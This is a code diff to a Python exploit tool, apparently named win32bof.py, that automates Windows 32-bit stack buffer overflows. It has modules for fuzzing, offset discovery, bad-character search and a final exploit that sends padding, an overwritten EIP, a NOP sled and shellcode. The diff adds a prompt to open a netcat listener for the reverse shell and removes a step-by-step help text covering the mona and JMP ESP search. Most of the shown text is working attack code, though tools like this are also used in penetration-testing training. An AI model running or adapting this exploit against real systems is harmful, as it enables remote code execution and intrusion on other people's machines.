@@ -99,6 +99,8 @@ def parseArgs(module, target, port, pattern_length, offset, eip_value, local_hos
     except ValueError:
         fail("{red}-t/--target must be a valid IP address!")
 
+    if not port:
+        fail("{red}-p/--port is required!")
     if port <= 0 or port > 65535:
         fail("{red}-p/--port must be between 0-65535!")
 
@@ -240,12 +242,16 @@ class Bof:
         info('Shellcode generated: {bblue}%d {rst}bytes' % len(self.shellcode))
         
     def exploit(self, nb_nop=16):
-        
+        global LHOST, LPORT
+
         EIP = struct.pack("<I", int(self.eip, 16))
         
         NOP = b'\x90' * nb_nop
 
         buffer = b'A'*self.offset + EIP + NOP + self.shellcode
+
+        warn("{bright}Set up a listener: `nc -lvp %s`. Press [ENTER] once done!{rst}" % LPORT)
+        input()
 
         try:
             self.sock.open()
@@ -317,7 +323,7 @@ class BadChars:
                 all_chars += chr(i)
         
         buffer = b'A'*self.offset + b'B'*4 + all_chars.encode()
-        print(b"buffer == " + buffer)
+
         try:
             self.sock.open()
 
@@ -450,36 +456,10 @@ class Fuzzing:
 
 # --------------------- END FIND CRASH --------------------
 
-def help(target, port):
-    cprint(' {bright}---------- HELP ----------{rst}\n\n\
-{bred}{bright}[STEP 1]{rst} Trigger an overflow\n\n\
-{bgreen}[+]{rst} Modify {bmagenta}EXPLOIT(sock, buffer){rst}\n\
-{bgreen}[+]{rst} {bright}python3 win32bof.py fuzz -t {target} -p {port}{rst}\n\
-(output) > {bblue}Fuzzing crashed at {byellow}<BUFFER_LEN>{bblue} bytes{rst}\n\n\
-{bred}{bright}[STEP 2]{rst} Get EIP location\n\n\
-{bgreen}[+]{rst} {bright}python3 win32bof.py offset -t {target} -p {port} -pl {byellow}<PATTERN_LEN>{rst}\n\
-(output) > {bblue}(eip value): {byellow}<ENTER_EIP_VALUE>{rst}\n\
-(output) > {bblue}(offset): {byellow}<OFFSET>{rst}\n\n\
-{bred}{bright}[STEP 3]{rst} Check EIP and confirm length of shellcode\n\n\
-{bgreen}[+]{rst} {bright}python3 win32bof.py check -t {target} -p {port} -o{byellow} <OFFSET>{rst}\n\n\
-{bred}{bright}[STEP 4]{rst} Find bad chars\n\n\
-{bgreen}[+]{rst} {bright}python3 win32bof.py badchars -t {target} -p {port} -o{byellow} <OFFSET>{rst} -b {byellow}<CHAR_1> <CHAR_2> {rst}...\n\n\
-{bred}{bright}[STEP 5]{rst} Find JMP ESP (or PUSH ESP RETN)\n\n\
-{bgreen}[+]{rst} {bright}/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb{rst}\n\
-(output) > {bblue}JMP ESP{rst}\n\
-(output) > {bblue}FFE4{rst}\n\
-{bgreen}[+]{rst} {bright}!mona modules{rst} (Look for no DEP, NX, ASLR && No Bad Char in address)\n\
-{bgreen}[+]{rst} {bright}!mona find -s "\\xff\\xe4" -m {byellow}<MODULE>.dll{bright}{rst}{bright} -cpb {byellow}<BAD_CHARS>{rst}\n\
-(gui output)> {byellow}<@JMP_ESP>{rst}\n\n\
-{bred}{bright}[STEP 6]{rst} Exploit\n\n\
-{bgreen}[+]{rst} Update {bmagenta}LHOST{rst} & {bmagenta}LPORT{rst} values\n\
-{bgreen}[+]{rst} {bright}python3 win32bof.py exploit -t {target} -p {port} -o {byellow}<OFFSET>{rst}{bright} -eip {byellow}<@JMP_ESP>{rst}{bright} -b {byellow}<BAD_CHARS>{rst}\n\n\
-{bright}[*] -------- END HELP --------{rst}')
-
 if __name__ == '__main__':
 
     parser = argparse.ArgumentParser(description='Fuzzing tool. (Python3 only)')
-    parser.add_argument('module', choices=['help', 'fuzz', 'offset', 'check', 'badchars', 'exploit'])
+    parser.add_argument('module', choices=['fuzz', 'offset', 'check', 'badchars', 'exploit'])
     parser.add_argument('-t', '--target', help='IP address targeted.')
     parser.add_argument('-p', '--port', type=int, help='Port number targeted.')
     parser.add_argument('-l', '--pattern-length', type=int, help='Pattern length (generated with msfvenom).')
@@ -492,10 +472,6 @@ if __name__ == '__main__':
 
     target, port = parseArgs(args.module, args.target, args.port, args.pattern_length, args.offset, args.eip_value, args.local_host, args.local_port)
     BAD_CHARS = initBadChars(args.bad_chars)
-
-    if args.module == 'help':
-        help(target, port)
-        sys.exit(0)
 
     info('{bright}----------- %s -----------{rst}' % args.module.upper())
     
